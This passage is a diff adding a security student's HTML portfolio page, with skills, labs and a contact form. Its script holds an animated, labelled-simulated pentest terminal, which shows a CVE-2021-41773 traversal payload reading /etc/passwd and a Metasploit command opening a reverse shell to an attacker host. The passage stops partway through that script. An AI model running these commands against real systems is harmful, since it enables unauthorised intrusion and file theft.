@@ -1,0 +1,918 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Gilbert Ronoh | Cyber Security Engineer</title>
+<meta name="description" content="Gilbert Ronoh — Cyber Security Engineer at the University of Eldoret. Penetration testing, CTF player, TryHackMe certified. Portfolio, labs and writeups.">
+<style>
+/* =========================================================
+   1. TOKENS & RESET
+   ========================================================= */
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+
+:root{
+  --bg:#0a0e12;
+  --bg-2:#0f151c;
+  --bg-3:#141c25;
+  --border:#1f2a35;
+  --text:#d6e1ea;
+  --muted:#8aa0b4;
+  --accent:#00e5a0;
+  --accent-dim:rgba(0,229,160,.12);
+  --amber:#ffb86b;
+  --mono:'JetBrains Mono','Fira Code','Cascadia Code',Consolas,monospace;
+  --sans:'Segoe UI',system-ui,-apple-system,Roboto,sans-serif;
+  --nav-h:64px;
+}
+
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:var(--sans);line-height:1.7;font-size:16px;-webkit-font-smoothing:antialiased}
+::selection{background:var(--accent);color:#04140d}
+img{max-width:100%;display:block}
+a{color:var(--accent);text-decoration:none}
+button{font-family:inherit}
+
+.container{width:min(1100px,90%);margin:0 auto}
+section{padding:90px 0}
+.tag{font-family:var(--mono);color:var(--accent);font-size:.82rem;letter-spacing:.15em;text-transform:uppercase}
+h2{font-size:clamp(1.6rem,4vw,2.2rem);margin:.4rem 0 1.2rem;line-height:1.2}
+.sub{color:var(--muted);max-width:660px}
+
+.card{background:var(--bg-3);border:1px solid var(--border);border-radius:12px;padding:1.6rem;transition:transform .25s,border-color .25s}
+.card:hover{transform:translateY(-4px);border-color:var(--accent)}
+
+/* =========================================================
+   2. NAVIGATION
+   ========================================================= */
+nav{position:fixed;top:0;left:0;right:0;z-index:100;background:rgba(10,14,18,.88);backdrop-filter:blur(10px);border-bottom:1px solid var(--border)}
+.nav-inner{display:flex;align-items:center;justify-content:space-between;height:var(--nav-h)}
+.logo{font-family:var(--mono);font-weight:700;font-size:1.02rem;color:var(--text)}
+.logo span{color:var(--accent)}
+.nav-links{display:flex;gap:1.6rem;list-style:none}
+.nav-links a{color:var(--muted);font-size:.9rem;transition:color .2s}
+.nav-links a:hover,.nav-links a.active{color:var(--accent)}
+.burger{display:none;background:none;border:0;cursor:pointer;flex-direction:column;gap:5px;padding:6px}
+.burger span{width:22px;height:2px;background:var(--accent);transition:.3s}
+
+/* =========================================================
+   3. HERO
+   ========================================================= */
+#hero{min-height:100vh;display:flex;align-items:center;padding-top:var(--nav-h);position:relative;overflow:hidden}
+#hero::before{
+  content:"";position:absolute;inset:0;
+  background-image:
+    linear-gradient(var(--accent-dim) 1px,transparent 1px),
+    linear-gradient(90deg,var(--accent-dim) 1px,transparent 1px);
+  background-size:48px 48px;opacity:.28;
+  mask-image:radial-gradient(circle at 70% 40%,#000 0%,transparent 72%);
+  -webkit-mask-image:radial-gradient(circle at 70% 40%,#000 0%,transparent 72%);
+}
+.hero-flex{position:relative;display:flex;align-items:center;gap:3.5rem}
+
+.profile-wrap{position:relative;width:220px;height:220px;flex-shrink:0}
+.profile-wrap img{width:100%;height:100%;object-fit:cover;border-radius:50%;border:2px solid var(--accent);box-shadow:0 0 0 6px var(--accent-dim);position:relative;z-index:1}
+.profile-wrap::after{content:"";position:absolute;inset:-12px;border:1px dashed var(--border);border-radius:50%;animation:spin 22s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+.hello{font-family:var(--mono);color:var(--accent);font-size:.92rem}
+.hero-flex h1{font-size:clamp(2.3rem,6.5vw,4rem);line-height:1.08;margin:.6rem 0}
+.hero-flex h1 em{font-style:normal;color:var(--accent)}
+.type-line{font-family:var(--mono);font-size:clamp(1rem,2.6vw,1.35rem);color:var(--muted);min-height:2.2rem}
+.cursor{display:inline-block;width:10px;background:var(--accent);animation:blink 1s step-end infinite;margin-left:2px}
+@keyframes blink{50%{opacity:0}}
+.hero-btns{display:flex;gap:1rem;margin-top:2rem;flex-wrap:wrap}
+.hero-meta{margin-top:2.4rem;font-family:var(--mono);font-size:.78rem;color:var(--muted);display:flex;gap:1.6rem;flex-wrap:wrap}
+.hero-meta b{color:var(--accent)}
+
+.btn{font-family:var(--mono);font-size:.88rem;padding:.8rem 1.5rem;border-radius:8px;border:1px solid var(--accent);transition:.25s;display:inline-block;cursor:pointer;background:none}
+.btn.primary{background:var(--accent);color:#04140d;font-weight:700}
+.btn.primary:hover{background:transparent;color:var(--accent)}
+.btn.ghost{color:var(--accent)}
+.btn.ghost:hover{background:var(--accent-dim)}
+.btn:disabled{opacity:.45;cursor:not-allowed}
+
+/* =========================================================
+   4. ANIMATED KALI TERMINAL
+   ========================================================= */
+#terminal{background:var(--bg-2)}
+.term-head{display:flex;justify-content:space-between;align-items:flex-end;gap:1rem;flex-wrap:wrap;margin-bottom:1.6rem}
+.terminal{
+  border:1px solid var(--border);border-radius:12px;overflow:hidden;
+  background:#05080b;box-shadow:0 0 0 1px rgba(0,229,160,.06),0 24px 60px -24px rgba(0,229,160,.25);
+}
+.term-bar{
+  display:flex;align-items:center;gap:.6rem;padding:.7rem 1rem;
+  background:#0b1117;border-bottom:1px solid var(--border);
+}
+.dot{width:11px;height:11px;border-radius:50%}
+.dot.r{background:#ff5f57}.dot.y{background:#febc2e}.dot.g{background:#28c840}
+.term-title{font-family:var(--mono);font-size:.75rem;color:var(--muted);margin-left:auto;margin-right:auto;transform:translateX(-1rem)}
+.term-body{
+  font-family:var(--mono);font-size:.82rem;line-height:1.75;padding:1.1rem 1.2rem 1.4rem;
+  height:420px;overflow-y:auto;position:relative;white-space:pre-wrap;word-break:break-word;
+}
+.term-body::-webkit-scrollbar{width:8px}
+.term-body::-webkit-scrollbar-thumb{background:var(--border);border-radius:4px}
+/* scanline overlay */
+.terminal{position:relative}
+.terminal::after{
+  content:"";position:absolute;inset:0;pointer-events:none;
+  background:repeating-linear-gradient(180deg,rgba(0,229,160,.035) 0 1px,transparent 1px 3px);
+  opacity:.5;
+}
+.t-line{min-height:1.35rem}
+.t-prompt{color:var(--accent);font-weight:700}
+.t-cmd{color:#eaf4fb}
+.t-gap{height:.7rem}
+.t-line.dim{color:#66798a}
+.t-line.ok{color:var(--accent)}
+.t-line.warn{color:var(--amber)}
+.t-line.accent{color:var(--accent);font-weight:700}
+.t-line.flag{color:#7ee787;font-weight:700;text-shadow:0 0 14px rgba(126,231,135,.35)}
+.term-foot{display:flex;justify-content:space-between;align-items:center;gap:1rem;flex-wrap:wrap;margin-top:1.2rem}
+.term-note{font-family:var(--mono);font-size:.72rem;color:var(--muted)}
+
+/* =========================================================
+   5. ABOUT
+   ========================================================= */
+.about-grid{display:grid;grid-template-columns:2fr 1fr;gap:2.5rem;align-items:start}
+.about-grid p{margin-bottom:1rem}
+.about-grid strong{color:var(--text)}
+.stat-box{background:var(--bg-3);border:1px solid var(--border);border-radius:12px;padding:1.3rem;margin-bottom:1rem}
+.stat-box b{font-family:var(--mono);font-size:1.6rem;color:var(--accent);display:block;line-height:1.2}
+.stat-box span{color:var(--muted);font-size:.82rem}
+
+/* =========================================================
+   6. SKILLS
+   ========================================================= */
+#skills{background:var(--bg-2)}
+.skills-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:1.2rem;margin-top:1.6rem}
+.skill-card h3{font-family:var(--mono);font-size:.98rem;color:var(--accent);margin-bottom:.9rem}
+.chips{display:flex;flex-wrap:wrap;gap:.5rem}
+.chip{font-family:var(--mono);font-size:.76rem;background:var(--accent-dim);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:.32rem .68rem}
+.bar-row{margin-top:1.1rem}
+.bar-row label{display:flex;justify-content:space-between;font-size:.76rem;color:var(--muted);font-family:var(--mono)}
+.bar{height:6px;background:var(--bg);border-radius:3px;margin-top:.35rem;overflow:hidden}
+.bar i{display:block;height:100%;background:var(--accent);width:0;transition:width 1.2s ease}
+
+/* =========================================================
+   7. PROJECTS
+   ========================================================= */
+.proj-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:1.3rem;margin-top:1.6rem}
+.proj-card .num{font-family:var(--mono);color:var(--accent);font-size:.78rem}
+.proj-card h3{margin:.4rem 0 .6rem;font-size:1.05rem}
+.proj-card p{color:var(--muted);font-size:.9rem}
+.proj-card .tags{margin-top:1rem;display:flex;flex-wrap:wrap;gap:.5rem}
+
+/* =========================================================
+   8. CERTIFICATIONS
+   ========================================================= */
+#certs{background:var(--bg-2)}
+.cert-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:1.2rem;margin-top:1.6rem}
+.cert-card{display:flex;gap:1rem;align-items:flex-start}
+.badge{font-family:var(--mono);background:var(--accent-dim);color:var(--accent);border:1px solid var(--border);border-radius:8px;padding:.55rem .75rem;font-size:.72rem;white-space:nowrap}
+.cert-card h4{font-size:.95rem;line-height:1.4}
+.cert-card p{color:var(--muted);font-size:.8rem;margin-top:.2rem}
+
+/* =========================================================
+   9. GALLERY
+   ========================================================= */
+.gal-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:1.2rem;margin-top:1.8rem}
+.gal-item{position:relative;overflow:hidden;border-radius:12px;border:1px solid var(--border);cursor:pointer;aspect-ratio:4/3;background:var(--bg-3)}
+.gal-item img{width:100%;height:100%;object-fit:cover;transition:transform .4s ease;filter:saturate(.9)}
+.gal-item:hover img{transform:scale(1.06);filter:saturate(1.1)}
+.gal-item .cap{
+  position:absolute;left:0;right:0;bottom:0;padding:1.9rem 1rem .9rem;
+  background:linear-gradient(transparent,rgba(4,8,12,.94));
+  font-family:var(--mono);font-size:.72rem;color:var(--muted);
+}
+.gal-item .cap b{color:var(--accent);display:block;font-size:.84rem;margin-bottom:.1rem;color:var(--text)}
+
+#lightbox{position:fixed;inset:0;background:rgba(4,8,12,.95);display:none;align-items:center;justify-content:center;flex-direction:column;padding:1.2rem;z-index:200}
+#lightbox.open{display:flex}
+#lightbox img{max-width:92%;max-height:80vh;border-radius:10px;border:1px solid var(--border)}
+#lightbox p{font-family:var(--mono);color:var(--muted);font-size:.82rem;margin-top:.9rem;text-align:center}
+#lightbox .close{position:absolute;top:1.1rem;right:1.4rem;font-family:var(--mono);color:var(--accent);font-size:.9rem;cursor:pointer;background:none;border:1px solid var(--border);border-radius:6px;padding:.4rem .7rem}
+
+/* =========================================================
+   10. WRITEUPS
+   ========================================================= */
+#writeups{background:var(--bg-2)}
+.wu-list{margin-top:1.6rem;display:flex;flex-direction:column;gap:1rem}
+.wu{display:flex;justify-content:space-between;align-items:center;gap:1rem;flex-wrap:wrap}
+.wu h4{font-size:.98rem}
+.wu .meta{font-family:var(--mono);font-size:.74rem;color:var(--muted)}
+.cat{font-family:var(--mono);font-size:.68rem;background:var(--accent-dim);color:var(--accent);padding:.24rem .6rem;border-radius:5px;white-space:nowrap}
+
+/* =========================================================
+   11. CONTACT
+   ========================================================= */
+.contact-wrap{max-width:640px}
+form{margin-top:1.6rem;display:flex;flex-direction:column;gap:1rem}
+input,textarea{
+  background:var(--bg-3);border:1px solid var(--border);border-radius:8px;
+  padding:.9rem 1rem;color:var(--text);font-family:var(--sans);font-size:.94rem;width:100%;resize:vertical;
+}
+input:focus,textarea:focus{outline:none;border-color:var(--accent)}
+.contact-links{display:flex;gap:1.3rem;margin-top:1.6rem;font-family:var(--mono);font-size:.84rem;flex-wrap:wrap}
+#formMsg{font-family:var(--mono);font-size:.78rem;color:var(--accent);display:none}
+
+/* =========================================================
+   12. FOOTER
+   ========================================================= */
+footer{border-top:1px solid var(--border);padding:1.6rem 0;text-align:center;color:var(--muted);font-size:.78rem;font-family:var(--mono)}
+footer span{color:var(--accent)}
+
+/* =========================================================
+   13. SCROLL REVEAL
+   ========================================================= */
+.reveal{opacity:0;transform:translateY(26px);transition:opacity .7s ease,transform .7s ease}
+.reveal.visible{opacity:1;transform:none}
+
+/* =========================================================
+   14. RESPONSIVE
+   ========================================================= */
+@media(max-width:900px){
+  .about-grid{grid-template-columns:1fr}
+}
+@media(max-width:800px){
+  .burger{display:flex}
+  .nav-links{
+    position:fixed;top:var(--nav-h);right:-100%;
+    flex-direction:column;background:var(--bg-2);width:min(76%,300px);
+    height:calc(100vh - var(--nav-h));padding:2rem;gap:1.4rem;
+    border-left:1px solid var(--border);transition:right .3s;
+  }
+  .nav-links.open{right:0}
+  .hero-flex{flex-direction:column-reverse;text-align:center}
+  .hero-btns,.hero-meta{justify-content:center}
+  .term-body{height:340px;font-size:.74rem;padding:.9rem}
+  section{padding:64px 0}
+  #hero{padding-top:calc(var(--nav-h) + 2rem)}
+}
+@media(prefers-reduced-motion:reduce){
+  *{animation:none!important;transition:none!important}
+  .reveal{opacity:1;transform:none}
+}
+</style>
+</head>
+<body>
+
+<!-- =========================================================
+     NAVIGATION
+     ========================================================= -->
+<nav>
+  <div class="container nav-inner">
+    <div class="logo">gilbert<span>@</span>sec:~$</div>
+    <button class="burger" id="burger" aria-label="Toggle menu" aria-expanded="false">
+      <span></span><span></span><span></span>
+    </button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="#about">About</a></li>
+      <li><a href="#terminal">Demo</a></li>
+      <li><a href="#skills">Skills</a></li>
+      <li><a href="#projects">Labs</a></li>
+      <li><a href="#certs">Certs</a></li>
+      <li><a href="#gallery">Gallery</a></li>
+      <li><a href="#writeups">Writeups</a></li>
+      <li><a href="#contact">Contact</a></li>
+    </ul>
+  </div>
+</nav>
+
+<!-- =========================================================
+     HERO
+     ========================================================= -->
+<section id="hero">
+  <div class="container hero-flex">
+
+    <!-- ==== INSERT YOUR PROFILE PHOTO HERE ====
+         Save your headshot as profile.jpg next to index.html.
+         Use 500x500px or larger, plain background, good lighting. -->
+    <div class="profile-wrap reveal">
+      <img src="sec.jpg" alt="Gilbert Ronoh — Cyber Security Engineer">
+    </div>
+
+    <div>
+      <p class="hello">&gt; initializing profile...</p>
+      <h1>GILBERT <em>RONOH</em></h1>
+      <div class="type-line"><span id="typed"></span><span class="cursor">&nbsp;</span></div>
+      <p class="sub" style="margin-top:1rem">
+        Cyber Security Engineer at the University of Eldoret — breaking systems in controlled
+        labs to learn how to defend them. Focused on penetration testing, CTF challenges
+        and responsible disclosure.
+      </p>
+      <div class="hero-btns">
+        <a href="#terminal" class="btn primary">watch_attack.sh</a>
+        <a href="#contact" class="btn ghost">contact --me</a>
+      </div>
+      <div class="hero-meta">
+        <div><b>THM</b> Active learner</div>
+        <div><b>CTF</b> Certified competitor</div>
+        <div><b>Focus</b> Offensive Security</div>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<!-- =========================================================
+     ANIMATED KALI TERMINAL
+     ========================================================= -->
+<section id="terminal">
+  <div class="container">
+    <div class="term-head">
+      <div>
+        <p class="tag reveal">// live_engagement</p>
+        <h2 class="reveal">Anatomy of a Pentest</h2>
+        <p class="sub reveal">
+          A simulated walkthrough of my methodology on a lab target:
+          recon → enumeration → CVE exploitation → privilege escalation → root.
+        </p>
+      </div>
+      <button class="btn ghost reveal" id="termReplay" disabled>replay_attack()</button>
+    </div>
+
+    <div class="terminal reveal">
+      <div class="term-bar">
+        <span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
+        <span class="term-title">gilbert@kali: ~/engagements/acme — zsh</span>
+      </div>
+      <div class="term-body" id="termBody" aria-live="polite"></div>
+    </div>
+
+    <div class="term-foot">
+      <p class="term-note">// simulated lab engagement — no live systems targeted</p>
+      <p class="term-note" id="termStatus">[ idle ]</p>
+    </div>
+  </div>
+</section>
+
+<!-- =========================================================
+     ABOUT
+     ========================================================= -->
+<section id="about">
+  <div class="container">
+    <p class="tag reveal">// whoami</p>
+    <h2 class="reveal">About Me</h2>
+    <div class="about-grid">
+      <div class="reveal">
+        <p>I'm <strong>Gilbert Ronoh</strong>, a cyber security engineer studying at the <strong>University of Eldoret (UOE)</strong>. My journey started with curiosity about how systems break — and grew into a disciplined practice of offensive security: reconnaissance, enumeration, exploitation, and reporting.</p>
+        <p>I train daily on <strong>TryHackMe</strong>, compete in <strong>CTF</strong> competitions, and build hands-on labs covering web application attacks, network exploitation, privilege escalation, and post-exploitation. I document every engagement as a professional report — because in this field, communication matters as much as the exploit.</p>
+        <p>My goal: become a full-time penetration tester and bug bounty hunter, contributing to safer software through responsible disclosure.</p>
+      </div>
+      <div class="reveal">
+        <div class="stat-box"><b data-count="100">0</b><span>TryHackMe rooms completed</span></div>
+        <div class="stat-box"><b data-count="15">0</b><span>CTF challenges solved</span></div>
+        <div class="stat-box"><b data-count="10">0</b><span>Lab machines rooted</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- =========================================================
+     SKILLS
+     ========================================================= -->
+<section id="skills">
+  <div class="container">
+    <p class="tag reveal">// skillset</p>
+    <h2 class="reveal">Technical Arsenal</h2>
+    <p class="sub reveal">Honest proficiency levels — always learning, always sharpening.</p>
+
+    <div class="skills-grid">
+      <div class="card skill-card reveal">
+        <h3>[ Offensive ]</h3>
+        <div class="chips">
+          <span class="chip">Nmap</span><span class="chip">Burp Suite</span><span class="chip">Metasploit</span>
+          <span class="chip">Gobuster</span><span class="chip">SQLMap</span><span class="chip">Hydra</span><span class="chip">Netcat</span>
+        </div>
+        <div class="bar-row"><label><span>Pentesting methodology</span><span>75%</span></label><div class="bar"><i data-w="75"></i></div></div>
+        <div class="bar-row"><label><span>Web exploitation</span><span>70%</span></label><div class="bar"><i data-w="70"></i></div></div>
+      </div>
+
+      <div class="card skill-card reveal">
+        <h3>[ Scripting ]</h3>
+        <div class="chips">
+          <span class="chip">Python</span><span class="chip">Bash</span><span class="chip">PowerShell</span><span class="chip">Git</span>
+        </div>
+        <div class="bar-row"><label><span>Python automation</span><span>80%</span></label><div class="bar"><i data-w="80"></i></div></div>
+        <div class="bar-row"><label><span>Bash scripting</span><span>70%</span></label><div class="bar"><i data-w="70"></i></div></div>
+      </div>
+
+      <div class="card skill-card reveal">
+        <h3>[ Networking &amp; Systems ]</h3>
+        <div class="chips">
+          <span class="chip">Linux</span><span class="chip">Windows AD</span><span class="chip">TCP/IP</span>
+          <span class="chip">Wireshark</span><span class="chip">Firewalls</span>
+        </div>
+        <div class="bar-row"><label><span>Linux administration</span><span>80%</span></label><div class="bar"><i data-w="80"></i></div></div>
+        <div class="bar-row"><label><span>Network protocols</span><span>70%</span></label><div class="bar"><i data-w="70"></i></div></div>
+      </div>
+
+      <div class="card skill-card reveal">
+        <h3>[ Defensive &amp; Reporting ]</h3>
+        <div class="chips">
+          <span class="chip">Log analysis</span><span class="chip">SIEM basics</span>
+          <span class="chip">OWASP Top 10</span><span class="chip">Threat modeling</span>
+        </div>
+        <div class="bar-row"><label><span>Vulnerability analysis</span><span>70%</span></label><div class="bar"><i data-w="70"></i></div></div>
+        <div class="bar-row"><label><span>Report writing</span><span>75%</span></label><div class="bar"><i data-w="75"></i></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- =========================================================
+     LABS & PROJECTS
+     ========================================================= -->
+<section id="projects">
+  <div class="container">
+    <p class="tag reveal">// labs &amp; projects</p>
+    <h2 class="reveal">Featured Engagements</h2>
+    <p class="sub reveal">Hands-on labs and self-directed projects. Each follows a full methodology: recon → enumeration → exploitation → post-exploitation → report.</p>
+
+    <div class="proj-grid">
+      <div class="card proj-card reveal">
+        <span class="num">[01]</span>
+        <h3>Web App Penetration Test Lab</h3>
+        <p>Full assessment of a deliberately vulnerable web application. Discovered and demonstrated SQL injection, XSS, and broken access control; delivered a remediation-focused report with CVSS scoring.</p>
+        <div class="tags"><span class="chip">Burp Suite</span><span class="chip">SQLi</span><span class="chip">OWASP Top 10</span><span class="chip">Reporting</span></div>
+      </div>
+
+      <div class="card proj-card reveal">
+        <span class="num">[02]</span>
+        <h3>Linux Privilege Escalation Study</h3>
+        <p>Systematic enumeration of misconfigured SUID binaries, cron jobs, and writable service paths across vulnerable VMs. Built a personal privesc checklist and companion Bash enumeration script.</p>
+        <div class="tags"><span class="chip">Linux</span><span class="chip">Privesc</span><span class="chip">Bash</span></div>
+      </div>
+
+      <div class="card proj-card reveal">
+        <span class="num">[03]</span>
+        <h3>Network Recon Automation Toolkit</h3>
+        <p>Python tooling that chains Nmap service detection with targeted vulnerability lookups and generates structured markdown output — built to speed up my own recon phase during CTFs.</p>
+        <div class="tags"><span class="chip">Python</span><span class="chip">Nmap</span><span class="chip">Automation</span></div>
+      </div>
+
+      <div class="card proj-card reveal">
+        <span class="num">[04]</span>
+        <h3>CTF Competition Playbook</h3>
+        <p>Documented methodology for web, forensics, and crypto challenges from CTF events. Includes a personal note system, tool cheat sheets, and post-event retrospectives.</p>
+        <div class="tags"><span class="chip">CTF</span><span class="chip">Forensics</span><span class="chip">Cryptography</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- =========================================================
+     CERTIFICATIONS
+     ========================================================= -->
+<section id="certs">
+  <div class="container">
+    <p class="tag reveal">// verified</p>
+    <h2 class="reveal">Certifications &amp; Achievements</h2>
+
+    <div class="cert-grid">
+      <div class="card cert-card reveal">
+        <div class="badge">THM</div>
+        <div>
+          <h4>TryHackMe — Completion Certificates</h4>
+          <p>Completed learning paths across fundamentals, offensive, and defensive security. <a href="#" target="_blank" rel="noopener">Verify →</a></p>
+        </div>
+      </div>
+
+      <div class="card cert-card reveal">
+        <div class="badge">CTF</div>
+        <div>
+          <h4>CTF Event Certificates</h4>
+          <p>Participation and placement certificates from capture-the-flag competitions. <a href="#" target="_blank" rel="noopener">Verify →</a></p>
+        </div>
+      </div>
+
+      <div class="card cert-card reveal">
+        <div class="badge">UOE</div>
+        <div>
+          <h4>BSc — University of Eldoret</h4>
+          <p>Computer science / cyber security studies, currently in progress.</p>
+        </div>
+      </div>
+
+      <div class="card cert-card reveal">
+        <div class="badge">NEXT</div>
+        <div>
+          <h4>In Progress</h4>
+          <p>Working toward eJPT / CompTIA Security+ certification. This space will be updated.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- =========================================================
+     LAB & TEAM GALLERY
+     ========================================================= -->
+<section id="gallery">
+  <div class="container">
+    <p class="tag reveal">// in the field</p>
+    <h2 class="reveal">Lab &amp; Team Work</h2>
+    <p class="sub reveal">Hands-on sessions — home lab builds, CTF competitions, and team engagements at UOE.</p>
+
+    <div class="gal-grid">
+      <!-- ==== INSERT YOUR LAB / TEAM PHOTOS HERE ====
+           Duplicate a .gal-item block for each photo.
+           - src="lab1.jpg"  → your image file (or images/lab1.jpg)
+           - <b> short title </b>
+           - <span> one-line context </span>
+           Recommended: 1200x900px (4:3), compressed under ~300KB. -->
+      <div class="gal-item reveal" data-caption="Home lab build — isolated attack and target VMs">
+        <img src="eng.PNG" alt="Home lab setup" loading="lazy">
+        <div class="cap"><b>Home Lab Setup</b><span>Kali + vulnerable VMs on an isolated network</span></div>
+      </div>
+
+      <div class="gal-item reveal" data-caption="Team CTF session — working through web challenges">
+        <img src="man.jpg" alt="CTF team session" loading="lazy">
+        <div class="cap"><b>CTF Team Session</b><span>Collaborative solving during a campus CTF event</span></div>
+      </div>
+
+      <div class="gal-item reveal" data-caption="Network pentest practical with classmates">
+        <img src="LAB3.PNG" alt="Network lab practical" loading="lazy">
+        <div class="cap"><b>Network Practical</b><span>Recon and enumeration exercise at UOE</span></div>
+      </div>
+
+      
+    </div>
+  </div>
+</section>
+
+<!-- =========================================================
+     WRITEUPS
+     ========================================================= -->
+<section id="writeups">
+  <div class="container">
+    <p class="tag reveal">// knowledge sharing</p>
+    <h2 class="reveal">Writeups &amp; Notes</h2>
+    <p class="sub reveal">Detailed walkthroughs of CTF challenges and lab machines. More coming as I publish.</p>
+
+    <div class="wu-list">
+      <div class="card wu reveal">
+        <div>
+          <h4>Coming soon: SQL Injection — from detection to data extraction</h4>
+          <span class="meta">Target: vulnerable web lab · Full methodology</span>
+        </div>
+        <span class="cat">WEB</span>
+      </div>
+
+      <div class="card wu reveal">
+        <div>
+          <h4>Coming soon: Linux privesc — SUID misconfiguration walkthrough</h4>
+          <span class="meta">Target: vulnerable VM · Step-by-step</span>
+        </div>
+        <span class="cat">PRIVESC</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- =========================================================
+     CONTACT
+     ========================================================= -->
+<section id="contact">
+  <div class="container contact-wrap">
+    <p class="tag reveal">// connect</p>
+    <h2 class="reveal">Get In Touch</h2>
+    <p class="sub reveal">Open to internships, junior security roles, CTF team invites, and responsible disclosure collaboration. Let's talk.</p>
+
+    <form id="contactForm" class="reveal">
+      <input type="text" name="name" placeholder="Your name" required>
+      <input type="email" name="email" placeholder="Your email" required>
+      <textarea name="message" rows="5" placeholder="Your message..." required></textarea>
+      <button type="submit" class="btn primary" style="align-self:flex-start">send_message()</button>
+      <p id="formMsg">[+] Message encoded. Opening your email client...</p>
+    </form>
+
+    <div class="contact-links reveal">
+      <!-- ==== REPLACE YOUR CONTACT DETAILS HERE ==== -->
+      <a href="mailto:libertogriezman4@gmail.com">[ email ]</a>
+      <a href="https://github.com/playboy340" target="_blank" rel="noopener">[ github ]</a>
+      <a href="https://www.linkedin.com/in/yourprofile" target="_blank" rel="noopener">[ linkedin ]</a>
+      <a href="https://tryhackme.com/p/yourusername" target="_blank" rel="noopener">[ tryhackme ]</a>
+    </div>
+  </div>
+</section>
+
+<!-- =========================================================
+     FOOTER
+     ========================================================= -->
+<footer>
+  <div class="container">
+    &copy; 2026 Gilbert Ronoh — <span>cyber security engineer</span> · Built from scratch, secured by design
+  </div>
+</footer>
+
+<script>
+/* =========================================================
+   0. UTILITIES
+   ========================================================= */
+const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
+const EMAIL  = "your.email@example.com"; // ==== REPLACE WITH YOUR EMAIL ====
+
+/* =========================================================
+   1. HERO TYPING ANIMATION
+   ========================================================= */
+(function heroTyping(){
+  const phrases = [
+    "Penetration Tester",
+    "Bug Bounty Hunter",
+    "CTF Player",
+    "Security Researcher",
+    "Linux Enthusiast"
+  ];
+  const el = document.getElementById("typed");
+  let phraseIdx = 0, charIdx = 0, deleting = false;
+
+  (function tick(){
+    const current = phrases[phraseIdx];
+    el.textContent = deleting ? current.slice(0, --charIdx) : current.slice(0, ++charIdx);
+
+    if (!deleting && charIdx === current.length) {
+      deleting = true;
+      return setTimeout(tick, 1600);
+    }
+    if (deleting && charIdx === 0) {
+      deleting = false;
+      phraseIdx = (phraseIdx + 1) % phrases.length;
+    }
+    setTimeout(tick, deleting ? 45 : 90);
+  })();
+})();
+
+/* =========================================================
+   2. MOBILE NAVIGATION
+   ========================================================= */
+(function mobileNav(){
+  const burger = document.getElementById("burger");
+  const links  = document.getElementById("navLinks");
+
+  burger.addEventListener("click", () => {
+    const open = links.classList.toggle("open");
+    burger.setAttribute("aria-expanded", open);
+  });
+
+  links.querySelectorAll("a").forEach(a =>
+    a.addEventListener("click", () => {
+      links.classList.remove("open");
+      burger.setAttribute("aria-expanded", "false");
+    })
+  );
+})();
+
+/* =========================================================
+   3. ANIMATED KALI TERMINAL — SIMULATED ENGAGEMENT
+   ========================================================= */
+(function terminalAttack(){
+
+  /* --- Script: each step is a command or a line of output --- */
+  const script = [
+    { type:"cmd", text:"nmap -sC -sV -p- -T4 10.10.11.42", wait:500 },
+    { type:"out", cls:"dim",  text:"Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-05 21:14 EAT" },
+    { type:"out", cls:"dim",  text:"Nmap scan report for acme.intranet (10.10.11.42)" },
+    { type:"out", text:"PORT     STATE  SERVICE   VERSION" },
+    { type:"out", cls:"ok",   text:"22/tcp   open   ssh       OpenSSH 8.2p1 Ubuntu 4ubuntu0.5" },
+    { type:"out", cls:"ok",   text:"80/tcp   open   http      Apache httpd 2.4.49 ((Ubuntu))" },
+    { type:"out", cls:"ok",   text:"443/tcp  open   ssl/http  Apache httpd 2.4.49 ((Ubuntu))" },
+    { type:"out", text:"|_http-title: Acme Corp — Internal Portal" },
+    { type:"out", cls:"dim",  text:"Nmap done: 1 IP address (1 host up) scanned in 38.21 seconds" },
+    { type:"gap" },
+
+    { type:"cmd", text:"gobuster dir -u http://10.10.11.42 -w /usr/share/wordlists/dirb/common.txt -q", wait:450 },
+    { type:"out", cls:"warn", text:"/admin                (Status: 301) [--> /admin/]" },
+    { type:"out", cls:"warn", text:"/backup               (Status: 301) [--> /backup/]" },
+    { type:"out", text:"/cgi-bin/             (Status: 403) [Size: 274]" },
+    { type:"out", text:"/uploads              (Status: 301) [--> /uploads/]" },
+    { type:"gap" },
+
+    { type:"cmd", text:"python3 CVE-2021-41773.py -u http://10.10.11.42", wait:450 },
+    { type:"out", cls:"accent", text:"[+] Apache 2.4.49 — path traversal / RCE detected (CVE-2021-41773)" },
+    { type:"out", cls:"dim",    text:"[+] payload: GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd" },
+    { type:"out", text:"root:x:0:0:root:/root:/bin/bash" },
+    { type:"out", text:"www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin" },
+    { type:"out", cls:"accent", text:"[+] traversal confirmed — escalating to remote code execution" },
+    { type:"gap" },
+
+    { type:"cmd", text:'msfconsole -q -x "use exploit/multi/http/apache_normalize_path_rce; set RHOSTS 10.10.11.42; set LHOST 10.10.14.7; run"', wait:550 },
+    { type:"out", text:"[*] Started reverse TCP handler on 10.10.14.7:4444" },
+    { type:"out", text:"[*] Sending stage (3020772 bytes) to 10.10.11.42" },
+    { type:"out", cls:"ok", text:"[*] Meterpreter session 1 opened (10.10.14.7:4444 -> 10.10.11.42:53124)" },
+    { type:"gap" },
+
